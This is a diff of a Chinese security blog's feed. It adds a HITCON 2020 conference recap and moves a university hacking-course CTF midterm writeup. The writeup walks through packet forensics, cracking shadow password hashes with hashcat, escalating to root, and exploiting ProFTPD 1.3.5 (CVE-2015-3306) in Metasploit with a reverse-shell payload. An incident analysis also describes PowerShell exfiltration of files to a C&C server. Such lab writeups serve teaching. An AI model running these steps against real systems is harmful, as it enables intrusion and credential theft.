+<p>議程部分的講師已經可以認出很多熟面孔了www<br>寬寬、birdman、小馬、Alan Lee、Orange Tsai、木棍Inndy、Allen Own、ddaa、yuawn、Angelboy、Lays、Jeffxx，幾乎都是駭客圈的紅人XD<br>這些大神們場子人都不會太少，尤其 Orange 再次打穿 Facebook 的主題在 R0 快被塞爆==</p>
+<p>在廠商攤位方面，照往例就是到處認親、認識朋友，只是同學把我當許願機拿贈品還稱讚我議程蟑螂… 嗚嗚幹，另外咱們 stavhaygn 在 UCCU 的主題是數位安全＆實體安全，蠻有趣的挑戰，讓我想起自己小時候筆電袋被父母上鎖時也是用迴紋針之類的工具慢慢解鎖ㄏ</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-3.webp" alt=" UCCU 實體解鎖挑戰"></p>
+<p>其他像是 DEVCORE、BambooFox、TeamT5、中華資安 都有各自的 CTF challenge，所以少了大地遊戲也不怕沒事做。另外 HITCON GIRLS 辦的 “Who is Lily?” OSINT 挑戰也很酷，還需要在 HITCON 現場找人、寄釣魚信件才算完成任務！</p>
+<p>在官方的活動中還有線上密室逃脫，很感謝 AIS3 室友的邀請，找齊四人就在會場的角落玩，甚至還被 iThome 記者拍到寫進<a href="https://www.ithome.com.tw/news/139967">新聞</a>裡wwwwww 至於玩法大致上都寫在文章內，比較障礙是我和揪來的學妹都沒有接觸過 minecraft，所以在操作上備受關愛ww</p>
+<p>至於有沒有拿到 Flag 呢… 我忘記了w 不過有挖到一題 pwn 但不確定隊友有沒有解出來，我自己是在不同房間到處亂晃找線索，還有玩 minetest 裡的電腦的踩地雷XD 活動結束後還有無差別槍戰不知道在幹嘛，我只記得我一直掉出場外領便當 : (</p>
+<div class="group-picture"><div class="group-picture-container"><div class="group-picture-row"><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-4.webp" alt=" minetest 踩地雷"></div><div class="group-picture-column" style="width: 50%;"><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-5.webp" alt=" minetest 風景?"></div></div></div></div>
+
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-6.webp" alt=" 槍戰 "></p>
+<p>印象中往年都有 HITCON token，今年也不例外。不過由於是用虛擬貨幣，所以對沒有再接觸的朋友很多都懶得操作，所以我<del>社工</del>借用身邊同學把官方送的錢包(300 HITCON token)轉到我手上，然後拿去HITCON線上商城買了幾塊電路板，到 Day2 甚至還開放可以購買現場的特色貼紙<br>… 當然是給他買爆 嘻嘻!!</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618836340/blog-posts/2020-08/19-hitcon-8.webp" alt=" hitcon token "></p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_600/v1618836340/blog-posts/2020-08/19-hitcon-7.webp" alt=" hitcon 貼紙 "></p>
+<p>沒有比較沒有傷害，雖然我是第一次參加 HITCON，但和其他場次相比感覺就是有點…掉漆，先不論少了往年慣例的電路板challenge、煉蠱大會開天窗。 Day1 報到的時候發了一個黑盒子沒有給提袋，看到大家都當寶貝到處抱著，結果那個黑盒子不僅是一次性的拆了就壞，而且裡頭都是廠商的DM … 怪不得 Day2 還能疊成塔拜託大家領走 = w =</p>
+<p><img src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1618836340/blog-posts/2020-08/19-hitcon-9.webp" alt=" 黑盒子 "></p>
+<p>總之，還是多少在 HITCON 聽到一些有趣的議題/關鍵字，只差在有沒有時間回去翻QwQ<br>接下來應該就是 10月的 MOPCON，已經要參加第四年應該寫不出心得了吧XDDDDDD</p>
+<p>就醬。</p>
+]]></content>
+      <categories>
+        <category>心得分享</category>
+      </categories>
+      <tags>
+        <tag>CISC</tag>
+        <tag>HITCON</tag>
       </tags>
   </entry>
   <entry>
@@ -1589,6 +1778,99 @@ Pwn大概就是這麼一回事了~
 <p>駭客先是使用 <code>dir</code> 指令成功讓網站執行並回傳資訊，確認 RCE 漏洞，再利用 PowerShell 不被 Windows 偵測的特性使用無檔案攻擊，將指令執行至 <a href="https://en.wikipedia.org/wiki/Active_Directory">AD</a> 中的子網域主機。在指令方面，駭客主要建立 C&amp;C Server 連線，並且將輸入指令以及回傳資訊透過 Get-Xor function 進行混淆，用意是增加資安人員在鑑識分析上的困難度。</p>
 <p>駭客取得主機執行指令的使用者權限後進行搜集情資，包含查看當前使用者(whoami)、網卡資訊(ipconfig /all)、系統資訊(systeminfo)、列出arp紀錄(arp -a)，查看網域底下其他主機資訊(nslookup)，最後才開始針對目錄進行探索。</p>
 <p>駭客從原目錄 <code>C:\Users\web\xampp\htdocs</code> 逐步移動到 <code>C:\Users\web\Desktop\_</code> 發現 passwords.txt 拿到 ftp、docx、sso 三組密碼，同時也在<code>C:\Users\web\Downloads</code> 底下找到 secret.docx，最後透過 PowerShell 指令將該檔案上傳至 C&amp;C Server。</p>
+]]></content>
+      <categories>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>HTCF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NSYSU 駭客攻防 Midterm Writeups</title>
+    <url>/2020/b5b674d24aef/</url>
+    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/monkey_flag.png" alt=" "></p>
+<p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF%20CTF/midterm/readme.md">MacacaHub HTCF Midterm writeups</a></p>
+<p>Author: <strong>stavhaygn</strong><br>Writeup By: <strong>yctseng1227</strong></p>
+<a id="more"></a>
+
+<br>
+
+<p>這次駭客攻防分成 筆試(1hr) &amp; 上機考(2hr)，根本就是金盾獎2.0，時間分配上要破台不太容易，何況為避免作弊情形還要邊寫題目邊截圖做個簡單報吿（嗚嗚好麻煩），題目難度我個人覺得中間偏易，畢竟助教也是根據老師上課所教的方向出題（甚至還有延伸學習），只是似乎對大部分同學來說比較沒有 CTF 經驗稍嫌困難一點，最後被老師建議下次多出一點基礎題 XDDDDDD</p>
+<p>老樣子先放上人權圖，被 MacacaHub 學弟搶走第一名好難過嗚嗚嗚<br>（唯一錯的那一次是 Flag 圖片打錯字，嗚嗚人生污點）<br><img src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1618835101/blog-posts/misc/htcf2020-myscore.webp" alt=" "></p>
+<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/scoreboard.png" alt=" "></p>
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="images-0x1-100-points-23-solves"><a href="#images-0x1-100-points-23-solves" class="headerlink" title="images 0x1 (100 points, 23 solves)"></a>images 0x1 (100 points, 23 solves)</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>images~ images~ images~</p>
+<blockquote>
+<p>hint: flag在圖片裡</p>
+</blockquote>
+<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/images_0x1.pcap">Released file (pcap)</a></p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><blockquote>
+<p>聽說不少人用 NetworkMiner 這軟體解得乾淨俐落（？）<br>不過考試當下封包數量不多就沒想這麼多，因此個人作法比叫偏手工</p>
+</blockquote>
+<p>用 wireshark 開啟 .pcap 後，用 <code>Follow &gt; TCP Stream</code>看大概只有 10 包 stream，其中不乏出現 .png 的 header 如圖。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/01.png" alt=" "></p>
+<p>這部分可以用 <code>File &gt; Export Objects &gt; HTTP...</code> 把指定的檔案 dump 出來（重點是 multipart/form-data）。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/02.png" alt=" "></p>
+<p>可以直接用 save all 把檔案存起來，然後用 hex editor 根據 <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG</a> 的 header 把圖片的修好。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/03.png" alt=" "></p>
+<p>圖片修完就看得到 Flag 了，全部大概五張我當時隨便戳就剛好是 Flag 了 ㄏㄏ</p>
+<h3 id="CSS-Keylogger-150-points-8-solves"><a href="#CSS-Keylogger-150-points-8-solves" class="headerlink" title="CSS-Keylogger (150 points, 8 solves)"></a>CSS-Keylogger (150 points, 8 solves)</h3><h4 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h4><p>有趣的CSS Keylogger文章：<br><a href="https://blog.techbridge.cc/2018/03/02/css-key-logger/">CSS keylogger：攻擊與防禦</a><br><a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense">Stealing Data With CSS: Attack and Defense</a></p>
+<p>嘗試在封包中分析此次的CSS Keylogger攻擊與受害者c7f網站上的信箱與密碼，並且嘗試登入</p>
+<blockquote>
+<p>hint: 運氣好或靠實力拿到小遊戲中的flag吧</p>
+</blockquote>
+<p>網站連結 <a href="http://c7f.macacahub.tw/login">http://c7f.macacahub.tw/login</a><br><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/CSS_Keylogger.pcap">Released file (pcap)</a></p>
+<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h4><p>題目給了兩篇關於 CSS Keylogger 的文章，算是課外補充。<br>如果認真對網站進行研究會發現該網站被駭入後，CSS Keylogger 寫在 <code>bootstrap.min.css</code> 內（不知道這個也解的出來啦 XD）。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/01.png" alt=" "></p>
+<p>從網站 source code 可以看得出來登入會驗證信箱格式、以及密碼會加鹽再 Hash，因此不用期待能把封包內撈到的 Hash 拿去爆破密碼 =w=</p>
+<p>從.pcap封包檔的 <code>Follow &gt; TCP Stream</code> 可以觀察到如文章所提的 CSS Keylogger 帶出的參數。</p>
+<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/02.png" alt=" "></p>
+<p>其中前面的 <code>/e/</code> 表示 email、<code>/p/</code> 表示password，也算一種小提示吧。<br>總之整理前面所觀察到的封包特徵，可以用 filter 簡單過濾出來（當然用 TCP Stream 慢慢點也是可以啦 XD）。</p>
+<blockquote>
+<p>http &amp;&amp; ip.dst == 45.79.159.73</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/03.png" alt=" "></p>
+<p>這樣就能拿到三組帳號，再來就是有點運氣的嘗試登入… 沒錯，會這麼說是因為我拿到帳密戳了半小時都沒成功，最後要放棄時就莫名其妙登入了XDDDDDD<br>事後和助教討論也沒得到個明確結果，如果有想法歡迎找我們討論QQ</p>
+<p>登入後… 抓猴子囉!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/04.gif" alt=" "></p>
+<p>基本上五隻猴子只有一隻點得到Flag，如果不想慢慢用滑鼠點的話可以縮小視窗把他們關起來，或是直接開 source code 找連結拿 Flag !!</p>
+<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/CSS-Keylogger/pic/05.png"></p>
+<h3 id="images-0x2-250-points-1-solve"><a href="#images-0x2-250-points-1-solve" class="headerlink" title="images 0x2 (250 points, 1 solve)"></a>images 0x2 (250 points, 1 solve)</h3><h4 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h4><p>小朋友才只用工具解題目，大朋友都寫code</p>
+<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/images_0x2.pcap">Released file (pcap)</a></p>
+<h4 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h4><p>這題看起來沒有什麼特殊情境，就是很刻意的希望同學用 coding 解決問題XD<br>基本作法和 <a href="https://blog.eevee.tw/2020/201104-htcf-hw1-writeup/">駭客攻防 hw_0x01 Writeup</a> 差不多，只是要還原的東西不太一樣。</p>
+<p>封包題起手式一樣 <code>Follow &gt; TCP Stream</code>，看到封包內容有 <code>xor_key</code>、<code>image</code> 那就是要把圖片 XOR 還原出來了，方向應該是不難猜，只是在往後看可以發現有多達100個圖片，所以還是乖乖寫扣ㄅ。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/01.png" alt=" "></p>
+<p>順帶一提、<code>xor_key</code> 是用 base64 混淆過，就算 Decode 還原出來也是難以辨識的字串，助教存心不給人手動驗證（雖然圖片好像也很難手工還原就是…）。</p>
+<p>scapy 的教學參考上面連結就不再贅述，不過要注意的是撈 Raw 欄位的資料會有兩種情況（如圖），推測是封包太長被截成兩段QQ ，條件判斷上可以根據封包長度或是判斷資料內容是否有關鍵字。最後，我們關心的重點在 <code>xor_key</code>、<code>image</code> 還有 … 檔名!! 寫完就知道了XD<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/02.png" alt=" "></p>
+<p>由於資料全部都串在一起，處理上有些麻煩… <code>xor_key</code> 和 <code>image</code> 可以用 <code>\r\n</code> 切出來，但 filename 就只能用 <a href="https://regex101.com/">Regular Expression</a> 篩出來，不然就是用指定位址的方式（因為圖片長度其實都相同 XD），剩下看扣應該不難懂：）</p>
+<figure class="highlight python"><figcaption><span>solve.py</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">pkts = rdpcap(<span class="string">&#x27;images_0x2.pcap&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> pkts:</span><br><span class="line">    <span class="keyword">if</span> IP <span class="keyword">in</span> p <span class="keyword">and</span> p[IP].dst == <span class="string">&#x27;140.117.169.219&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> p <span class="keyword">and</span> <span class="string">b&#x27;filename&#x27;</span> <span class="keyword">in</span> p[Raw].load:</span><br><span class="line">            raw = p[Raw].load</span><br><span class="line"></span><br><span class="line">            filename = re.search(<span class="string">b&#x27;filename=&quot;(\w*.\w*)&quot;&#x27;</span>, raw)</span><br><span class="line">            filename = filename.group(<span class="number">1</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            xor_key = base64.b64decode(raw.split(<span class="string">b&#x27;\r\n&#x27;</span>)[<span class="number">3</span>])</span><br><span class="line">            ciphertext = raw.split(<span class="string">b&#x27;\r\n&#x27;</span>)[<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 用 mod 的方式重複 padding xor_key</span></span><br><span class="line">            res = [ word ^ xor_key[idx % len(xor_key)] <span class="keyword">for</span> idx, word <span class="keyword">in</span> enumerate(ciphertext) ]</span><br><span class="line"></span><br><span class="line">            img = open(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">            img.write(bytes(res))</span><br><span class="line">            img.close()</span><br></pre></td></tr></table></figure>
+
+<p>成功把所有圖片 dump 出來，會發現有分兩種檔名，分別是 0-27 還有 時間戳記，剩下就是慢慢拼 Flag 了!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x2/pic/03.png" alt=" "></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="hashmeow-120-points-2-solves"><a href="#hashmeow-120-points-2-solves" class="headerlink" title="hashmeow (120 points, 2 solves)"></a>hashmeow (120 points, 2 solves)</h3><h4 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h4><p>macacahub.tw 又多開了一個 port 提供 ssh<br>你想要進來拿flag嗎？<br>想要的話可以全部給你… 去找吧！我把所有的帳密都放在檔案裡了</p>
+<blockquote>
+<p>hint 1: 檔案從該提供ssh服務的主機掉出來的<br>hint 2: 10k-most-common.txt 不錯用<br>hint 3: port_number &gt; 1000 &amp;&amp; port_number != 8778 &amp;&amp; port_number != htcf.ports.port_number<br>hint 4: flag在linux某個權限為1777的神奇目錄下<br>hint 5: 運氣也是種實力</p>
+</blockquote>
+<h4 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h4><p>如果有寫過 htcf 的練習題應該知道掃 port 的起手式就是 nmap，掃描查看 Domain 底下開了哪些 port 的服務 (其中 <code>-p-</code> 等同 <code>-p 0-65535</code>)。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p- macacahub.tw</span><br><span class="line">nmap -sV -p 55555 macacahub.tw</span><br></pre></td></tr></table></figure>
+
+<p>根據 hint 3 ，我們可以知道目標 port 是 55555，再進一步利用 <code>-sV</code> 查到是 ssh 服務（hint 1），結果如下。</p>
+<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/01.png" alt=" "></p>
+<p>找到連線入口，接下來我們需要 ssh 連線的帳號密碼。<br>從題目給的 passwd 和 shadow 其實就是存放密碼的檔案，只不過是被 Hash 過的 (可參考 <a href="https://www.cyberciti.biz/faq/understanding-etcshadow-file/">相關文章</a>），如果想知道更細節內容可以去翻 <a href="http://linux.vbird.org/linux_basic/0410accountmanager.php">鳥哥的私房菜</a>，總之這裡我們需要想辦法把密碼爆破出來!!<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/03.png" alt=" "></p>
+<p>根據 hint 2，可以找到字典檔 <a href="https://github.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt">10k-most-common.txt</a> 並下載至本機端。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/02.png" alt=" "></p>
+<p>再來就是用 <code>hashcat</code> 這個密碼還原工具，題目的 hashmeow 其實就是在暗示這個XDDDD 可參考 hashcat 相關文章，要注意的是 shadow 內的 $6$ 是指 SHA-512，指令要對應到 <code>-m 1800</code>，另外結尾要掛上 <code>--show</code> 不然會沒有結果（笑），針對 shadow 使用 hashcat 可以找到兩組密碼，分別是 root:root 和 shelly:shelly，真的是<strong>弱密碼</strong>欸… 原來是 hint 5 的部分啊。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/04.png" alt=" "></p>
+<p>接著就是要嘗試用 shelly 的帳號登入（平常並不會有人直接用 root 登入，雖然這題預設也鎖 root 登入）。<br>最後就是在裡頭找 Flag 啦，根據 hint 4，可以 Google 發現 1777 權限分數其實指的就是 <code>/tmp</code> 目錄，細節同樣可參考 <a href="http://linux.vbird.org/linux_basic_train/unit05.php">鳥哥私房菜</a>，進到 <code>/tmp</code> 找到 secret 資料夾後輕鬆拿 Flag。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/05.png" alt=" "></p>
+<h3 id="hashmeow-root-50-points-1-solve"><a href="#hashmeow-root-50-points-1-solve" class="headerlink" title="hashmeow root (50 points, 1 solve)"></a>hashmeow root (50 points, 1 solve)</h3><h4 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h4><p>與hashmeow同題目<br>但是flag在root的家裡</p>
+<h4 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h4><p>承接上題的作法，分數比較低的原因是 Flag 單純放不同資料夾而已 XD<br>回到根目錄<code>/</code>，並且根據提示移動到 root 目錄會發現權限不足，就連 <code>sudo</code> 也不能用QQ 不過有一招基本的提權方式是 <code>sudo su</code>，那我們可以從 <code>bin</code> 目錄找到 <code>su</code> 並且直接執行，被要求輸入的root密碼就是我們剛剛透過 hashcat 爆出來的 root:root，輕鬆提權!!!</p>
+<p>剩下就只是回 <code>/root</code>，拿 Flag !!</p>
+<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/hashmeow/pic/06.png" alt=" "></p>
+<h3 id="ProFTPD-120-points-0-solve"><a href="#ProFTPD-120-points-0-solve" class="headerlink" title="ProFTPD (120 points, 0 solve)"></a>ProFTPD (120 points, 0 solve)</h3><h4 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h4><p>區網中有一個FTP伺服器，好像有漏洞來著(網路遮罩255.255.255.0，不是 xxx.xxx.xxx.1那台主機)</p>
+<p>請先ssh遠端連線至攻擊用主機(同CTF平台初始的帳號密碼) 接著在攻擊機的區網中找出有漏洞的主機 並且exploit有漏洞的主機 最後取得”/var/www/html/_backup”目錄下的flag檔</p>
+<p>ssh -p 8778 {你的帳號}@macacahub.tw</p>
+<blockquote>
+<p>hint: 建議修改預設LPORT</p>
+</blockquote>
+<h4 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h4><p>登入”攻擊用主機”後，根據題目描述要從區網中找出有漏洞的主機（也提示 FTP Server），先找到目前主機的 IP ，再透過 nmap 掃區網。<br>以本題為例，IP 為 172.30.0.3，則區網掃描可以用 <code>172.30.0.0/24</code> 或是 <code>172.30.0.*</code>，先確認 FTP 主機存在再查看版本細項，暴力一點可以直接用 <code>nmap -A 172.30.0.0/24</code> 一次把細節全部列出來。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/01.png" alt=" "></p>
+<p>可以找到該 FTP Server 的版本為 <code>ProFTPD 1.3.5</code>，可以從 Google 發現有漏洞編號 <strong>CVE-2015-3306</strong>，那就是用上課所學的 Metasploit Framework 嘗試針對這個漏洞進行攻擊。 …沒錯!! 現在登入的這台”攻擊用主機”已經把你把相關工具都裝好了，可以直接下 <code>msfconsole</code> 來找關於漏洞相關的工具，如果懶得從 Google 找漏洞編號，也可以直接在 msf 搜尋 <code>ProFTPD 1.3.5</code> 相關攻擊工具。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/02.png" alt=" "></p>
+<p>剩下就是工具使用，如果有寫課堂作業應該知道基本的操作方式..吧XD<br>參數的設定上 RHOST 目標IP為 nmap 掃出來的 172.30.0.2，SITEPATH 為題目描述的 <code>/var/www/html/</code>（我們其實沒有權限存取 <code>_backup</code>），這題還需要設定 payloads… 而且並不是每一組 payload 都能成功需要一點運氣，不過數量也不多把 payload 全部戳一遍也蠻快der。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/03.png" alt=" "></p>
+<p>設定完 payload 後記得要再確認一次 options，把 LHOST 補上”攻擊用主機”，以便打過去的 reverse shell 才能順利彈回來，若攻擊成功就能拿到 FTP Server 的 shell，剩下就是把 flag 撈出來，結束。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/ProFTPD/pic/04.png" alt=" "></p>
+<figure class="highlight shell"><figcaption><span>簡單列一下流程</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ifconfig <span class="comment">#查看當前主機ip: 172.30.0.3</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap 172.30.0.0/24 <span class="comment">#掃區網，找到 FTP 主機(ip 172.30.0.2, port 21)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV -p 21 172.30.0.2 <span class="comment">#查看剛主機細部資訊，發現是ProFTPD 1.3.5</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> msfconsole</span></span><br><span class="line">msf5 &gt; search ProFTPD 1.3.5</span><br><span class="line">msf5 &gt; use unix/ftp/proftpd_modcopy_exec</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show options</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set RHOST &lt;target_ip&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set SITEPATH &lt;target_directory&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show payloads</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set payload cmd/unix/reverse_perl</span><br><span class="line"></span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; show options</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; set LHOST &lt;localhost_ip&gt;</span><br><span class="line">msf5 exploit(unix/ftp/proftpd_modcopy_exec) &gt; exploit</span><br><span class="line"></span><br><span class="line">(reverse shell)</span><br><span class="line">ls </span><br><span class="line">ls _backup</span><br><span class="line">cat _backup/f1aaag.txt</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <categories>
         <category>Security</category>
@@ -1748,99 +2030,6 @@ Pwn大概就是這麼一回事了~
       </tags>
   </entry>
   <entry>
-    <title>NSYSU 駭客攻防 Midterm Writeups</title>
-    <url>/2020/b5b674d24aef/</url>
-    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/monkey_flag.png" alt=" "></p>
-<p>Writeups 搬自 <a href="https://github.com/MacacaHub/CTF-writeups/blob/master/HTCF%20CTF/midterm/readme.md">MacacaHub HTCF Midterm writeups</a></p>
-<p>Author: <strong>stavhaygn</strong><br>Writeup By: <strong>yctseng1227</strong></p>
-<a id="more"></a>
-
-<br>
-
-<p>這次駭客攻防分成 筆試(1hr) &amp; 上機考(2hr)，根本就是金盾獎2.0，時間分配上要破台不太容易，何況為避免作弊情形還要邊寫題目邊截圖做個簡單報吿（嗚嗚好麻煩），題目難度我個人覺得中間偏易，畢竟助教也是根據老師上課所教的方向出題（甚至還有延伸學習），只是似乎對大部分同學來說比較沒有 CTF 經驗稍嫌困難一點，最後被老師建議下次多出一點基礎題 XDDDDDD</p>
-<p>老樣子先放上人權圖，被 MacacaHub 學弟搶走第一名好難過嗚嗚嗚<br>（唯一錯的那一次是 Flag 圖片打錯字，嗚嗚人生污點）<br><img src="https://photos.smugmug.com/photos/i-TRnZ5Dq/0/8cbf32c9/XL/i-TRnZ5Dq-XL.png" alt=" "></p>
-<h2 id="Scoreboard"><a href="#Scoreboard" class="headerlink" title="Scoreboard"></a>Scoreboard</h2><p><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/scoreboard.png" alt=" "></p>
-<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="images-0x1-100-points-23-solves"><a href="#images-0x1-100-points-23-solves" class="headerlink" title="images 0x1 (100 points, 23 solves)"></a>images 0x1 (100 points, 23 solves)</h3><h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>images~ images~ images~</p>
-<blockquote>
-<p>hint: flag在圖片裡</p>
-</blockquote>
-<p><a href="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/images_0x1.pcap">Released file (pcap)</a></p>
-<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h4><blockquote>
-<p>聽說不少人用 NetworkMiner 這軟體解得乾淨俐落（？）<br>不過考試當下封包數量不多就沒想這麼多，因此個人作法比叫偏手工</p>
-</blockquote>
-<p>用 wireshark 開啟 .pcap 後，用 <code>Follow &gt; TCP Stream</code>看大概只有 10 包 stream，其中不乏出現 .png 的 header 如圖。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/01.png" alt=" "></p>
-<p>這部分可以用 <code>File &gt; Export Objects &gt; HTTP...</code> 把指定的檔案 dump 出來（重點是 multipart/form-data）。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/02.png" alt=" "></p>
-<p>可以直接用 save all 把檔案存起來，然後用 hex editor 根據 <a href="https://en.wikipedia.org/wiki/Portable_Network_Graphics">PNG</a> 的 header 把圖片的修好。<br><img src="https://raw.githubusercontent.com/MacacaHub/CTF-writeups/master/HTCF%20CTF/midterm/image%200x1/pic/03.png" alt=" "></p>
-<p>圖片修完就看得到 Flag 了，全部大概五張我當時隨便戳就剛好是 Flag 了 ㄏㄏ</p>
